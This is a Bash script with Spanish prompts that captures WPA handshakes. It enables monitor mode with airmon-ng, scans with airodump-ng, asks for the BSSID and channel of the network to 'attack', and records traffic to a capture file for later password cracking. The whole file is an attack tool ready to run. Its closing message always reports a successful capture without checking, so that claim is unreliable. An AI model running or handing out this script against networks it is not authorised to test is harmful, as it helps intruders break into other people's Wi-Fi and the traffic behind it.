#!/bin/bash

# Verificar si el script se está ejecutando como root
if [[ $EUID -ne 0 ]]; then
   echo "Este script debe ejecutarse como root" 
   exit 1
fi

# Función para mostrar la ayuda del script
function show_help() {
    echo "Uso: $0 -i interfaz -o handshake_file"
    echo "Ejemplo: $0 -i wlan0 -o handshake.cap"
}

# Función para configurar la interfaz en modo monitor
function set_monitor_mode() {
    echo "Configurando la interfaz en modo monitor..."
    # Poner la interfaz en modo monitor con airmon-ng
    if ! airmon-ng start $interface; then
        echo "Error al configurar la interfaz en modo monitor."
        exit 1
    fi
    monitor_interface="${interface}mon"
    echo "Interfaz configurada en modo monitor: $monitor_interface"
}

# Función para restaurar la configuración original de la interfaz
function restore_original_mode() {
    echo "Restaurando la configuración original de la interfaz..."
    # Detener la interfaz en modo monitor
    if ! airmon-ng stop $monitor_interface; then
        echo "Error al restaurar la configuración original de la interfaz."
        exit 1
    fi
    echo "Interfaz restaurada a su configuración original."
}

# Función para escanear redes y seleccionar una
function select_network() {
    echo "Escaneando redes disponibles..."
    airodump-ng $monitor_interface
    read -p "Ingrese el BSSID de la red Wi-Fi a la que desea atacar: " bssid
    read -p "Ingrese el número del canal de la red Wi-Fi: " channel
    echo "Seleccionó la red con BSSID $bssid en el canal $channel."
}

# Parsear los argumentos de línea de comandos
while getopts ":i:o:h" opt; do
    case ${opt} in
        i )
            interface=$OPTARG
            ;;
        o )
            handshake_file=$OPTARG
            ;;
        h )
            show_help
            exit 0
            ;;
        \? )
            echo "Opción inválida: -$OPTARG" 1>&2
            show_help
            exit 1
            ;;
        : )
            echo "La opción -$OPTARG requiere un argumento." 1>&2
            show_help
            exit 1
            ;;
    esac
done
shift $((OPTIND -1))

# Verificar si se proporcionaron todos los argumentos requeridos
if [[ -z $interface || -z $handshake_file ]]; then
    echo "Se deben proporcionar todos los argumentos requeridos."
    show_help
    exit 1
fi

# Configurar la interfaz en modo monitor
set_monitor_mode

# Escanear redes y seleccionar una
select_network

# Iniciar la captura de paquetes con airodump-ng
airodump-ng --bssid "$bssid" --channel "$channel" --write $handshake_file --write-interval 1 $monitor_interface

# Restaurar la configuración original de la interfaz
restore_original_mode

echo "¡Handshake capturado con éxito!"
